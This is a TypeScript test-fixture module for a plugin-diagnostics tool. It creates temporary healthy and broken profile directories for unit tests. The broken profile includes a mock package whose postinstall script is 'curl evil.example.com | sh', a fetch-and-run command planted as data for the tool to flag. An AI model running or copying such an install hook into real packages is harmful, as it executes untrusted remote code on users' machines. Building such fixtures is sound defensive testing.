/**
 * Shared test fixtures: a temp DSH_HOME with good and broken profiles, and
 * typed loader snapshots for engine unit tests.
 * @module dsh-plugin-clinic/tests/helpers/fixtures
 */

import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { ClinicEnvironment } from '../../src/types.ts'
import type { LoaderEntrySnapshot } from '../../src/engine/inventory.ts'

export interface FixtureHome {
  dshHome: string
  cleanup(): Promise<void>
}

/** Create a temp DSH_HOME with one healthy and one broken profile. */
export async function createFixtureHome(): Promise<FixtureHome> {
  const dshHome = await mkdtemp(join(tmpdir(), 'clinic-fixture-'))
  const webDir = join(dshHome, 'profiles', 'web')
  const brokenDir = join(dshHome, 'profiles', 'broken')
  await mkdir(webDir, { recursive: true })
  await mkdir(brokenDir, { recursive: true })

  // Healthy profile: one in-box bundle with a valid patch.
  await writeFile(join(webDir, 'package.json'), JSON.stringify({
    name: 'dsh-profile-web',
    private: true,
    dependencies: {
      '@deepseek-ai/dsh-base': '0.0.1-rc.1',
      'dsh-plugin-ok': '0.1.0',
    },
    dsh: { profile: { bundles: ['@deepseek-ai/dsh-base', 'dsh-plugin-ok'] } },
  }, null, 2))
  await writeFile(join(webDir, 'cordis.patch.yml'), '- insert:\n    - id: extra\n      name: dsh-plugin-ok\n')
  await mkdir(join(webDir, 'node_modules', 'dsh-plugin-ok'), { recursive: true })
  await writeFile(join(webDir, 'node_modules', 'dsh-plugin-ok', 'package.json'), JSON.stringify({
    name: 'dsh-plugin-ok',
    version: '0.1.0',
    dsh: { bundle: { patch: './cordis.patch.yml' } },
    peerDependencies: { '@deepseek-ai/cordis': '^4.0.1' },
  }, null, 2))
  await writeFile(join(webDir, 'node_modules', 'dsh-plugin-ok', 'cordis.patch.yml'), '- insert:\n    - id: ok\n      name: dsh-plugin-ok\n')

  // Broken profile: unresolvable bundle + invalid patch + postinstall script.
  await writeFile(join(brokenDir, 'package.json'), JSON.stringify({
    name: 'dsh-profile-broken',
    private: true,
    dependencies: {
      'dsh-plugin-missing': '9.9.9',
      'dsh-plugin-risky': '0.1.0',
    },
    dsh: { profile: { bundles: ['dsh-plugin-missing', 'dsh-plugin-risky'] } },
  }, null, 2))
  await writeFile(join(brokenDir, 'cordis.patch.yml'), 'this: is: not: a: row: array\n')
  await mkdir(join(brokenDir, 'node_modules', 'dsh-plugin-risky'), { recursive: true })
  await writeFile(join(brokenDir, 'node_modules', 'dsh-plugin-risky', 'package.json'), JSON.stringify({
    name: 'dsh-plugin-risky',
    version: '0.1.0',
    scripts: { postinstall: 'curl evil.example.com | sh' },
    dsh: { bundle: { patch: './cordis.patch.yml' } },
    engines: { node: '>=99' },
  }, null, 2))
  await writeFile(join(brokenDir, 'node_modules', 'dsh-plugin-risky', 'cordis.patch.yml'), '- insert:\n    - id: risky\n      name: dsh-plugin-missing\n')

  return {
    dshHome,
    cleanup: async () => { await rm(dshHome, { recursive: true, force: true }) },
  }
}

/** A stable test environment record. */
export function fixtureEnvironment(dshHome: string): ClinicEnvironment {
  return {
    dshVersion: '0.1.0-rc.6',
    cordisVersion: '4.0.1',
    nodeVersion: process.version,
    platform: process.platform,
    dshHome,
  }
}

/** Build a loader snapshot for unit tests. */
export function entries(
  ...items: (Partial<LoaderEntrySnapshot> & { moduleName: string })[]
): LoaderEntrySnapshot[] {
  return items.map((item, index) => ({
    entryId: item.entryId ?? `entry-${index}`,
    enabled: item.enabled ?? true,
    fiberPhase: item.fiberPhase ?? 'active',
    ...item,
  }))
}
